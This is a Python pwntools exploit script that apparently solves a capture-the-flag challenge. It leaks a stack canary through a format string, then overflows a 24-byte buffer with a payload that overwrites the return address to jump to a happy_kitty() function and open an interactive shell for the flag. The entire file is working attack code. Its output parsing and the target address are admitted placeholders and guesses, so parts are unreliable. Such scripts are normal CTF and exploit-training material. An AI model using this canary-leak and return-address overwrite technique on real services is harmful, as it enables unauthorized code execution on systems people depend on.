from pwn import *

HOST = '10.42.0.2'  # Replace with the actual IP
PORT = 38074        # Replace with the actual port

# Function to leak the canary via a format string in kittens[0]
def leak_canary():
    r = remote(HOST, PORT)
    r.sendlineafter('> How long is your name? ', '0')  # Trigger kittens[0]
    r.sendlineafter('> What is your name? ', '')       # Empty input (v4=0)
    
    # Read the output to find the canary
    output = r.recvuntil('=======================================================================================================\n').decode()
    r.close()
    
    # Example parsing: Assume kittens[0] is "%llx" and outputs the canary as the first value
    canary = int(output.split('\n')[1], 16)  # Adjust based on actual format string
    return canary

# Function to exploit the buffer overflow
def exploit(canary, happy_kitty_addr):
    r = remote(HOST, PORT)
    
    # Build the payload
    buffer_size = 24
    offset_to_ret = buffer_size + 8 + 8  # 24 (buffer) + 8 (canary) + 8 (saved RBP)
    payload = b'A' * buffer_size          # Fill the buffer
    payload += p64(canary)               # Overwrite canary
    payload += b'B' * 8                  # Overwrite saved RBP (ignored)
    payload += p64(happy_kitty_addr)     # Jump to happy_kitty()
    
    # Trigger overflow
    r.sendlineafter('> How long is your name? ', '-1')  # Length -1 (0xFF)
    r.sendlineafter('> What is your name? ', payload)
    
    # Get the flag
    r.interactive()

if __name__ == "__main__":
    # Leak the canary
    canary = leak_canary()
    print(f"Leaked Canary: {hex(canary)}")
    
    # Replace with the actual address of happy_kitty() (e.g., from disassembly)
    happy_kitty_addr = 0x000000000000128A  # Replace with the real address
    
    # Exploit
    exploit(canary, happy_kitty_addr)